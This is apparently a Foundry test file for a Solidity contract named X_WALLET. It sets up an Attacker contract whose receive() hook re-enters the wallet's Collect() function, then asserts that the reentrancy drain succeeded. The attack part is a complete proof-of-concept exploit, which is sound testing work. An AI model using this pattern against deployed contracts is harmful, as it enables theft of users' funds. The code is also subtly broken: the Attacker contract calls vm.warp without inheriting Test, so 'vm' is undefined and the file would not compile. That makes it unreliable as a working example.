
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {X_WALLET} from "../src/X_WALLET.sol";
import {Log} from "../src/Log.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyX_WALLET is Test {
    using stdStorage for StdStorage;
    
    X_WALLET public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new X_WALLET(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);

        uint256 depositAmount = attackVal * 2;
        vm.assume(depositAmount > 0 && depositAmount <= type(uint128).max);

        vm.deal(address(_contractUnderTest), depositAmount);
        vm.deal(address(_attacker), depositAmount);
        vm.deal(address(this), depositAmount);

        _attacker.setupAttack{value: depositAmount}(attackVal, depositAmount);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = X_WALLET(victimAddress);
    }

    function setupAttack(uint256 val, uint256 depositAmount) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        victim.Put{value: depositAmount}(block.timestamp);
        
        vm.warp(block.timestamp + 1);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(victim).balance;
        
        victim.Collect(val);
        
        if (attackCallCount > 1 && address(victim).balance < initialSnapshot - val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }
}
